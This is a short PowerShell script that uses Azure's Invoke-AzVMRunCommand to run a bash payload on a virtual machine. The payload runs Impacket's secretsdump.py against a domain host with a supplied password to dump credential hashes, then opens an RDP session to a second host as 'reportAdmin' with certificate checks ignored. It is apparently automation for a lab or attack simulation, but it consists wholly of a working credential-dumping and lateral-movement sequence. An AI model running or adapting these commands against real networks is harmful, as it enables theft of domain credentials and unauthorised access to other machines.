param (
    [string]$adminPassword,
    [string]$vmName,
    [string]$resourceGroupName
)

Import-Module Az.Compute
Import-Module Az.Accounts

Connect-AzAccount -Identity

$Command = @"
#!/bin/bash
sudo /root/.local/bin/secretsdump.py 'ODOMAIN/ssupport:$adminPassword'@10.0.0.5
Xvfb :99 -screen 0 1024x768x16 &
sleep 30
su - adm0 -c 'whoami'
su - adm0 -c 'DISPLAY=:99 timeout 90 xfreerdp /v:10.0.0.4 /u:reportAdmin /p:'$adminPassword' /dynamic-resolution /cert:ignore &'
"@


$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $vmName -CommandId "RunShellScript" -ScriptString $Command
# View the full output

$output.Value | ForEach-Object { $_.Message }
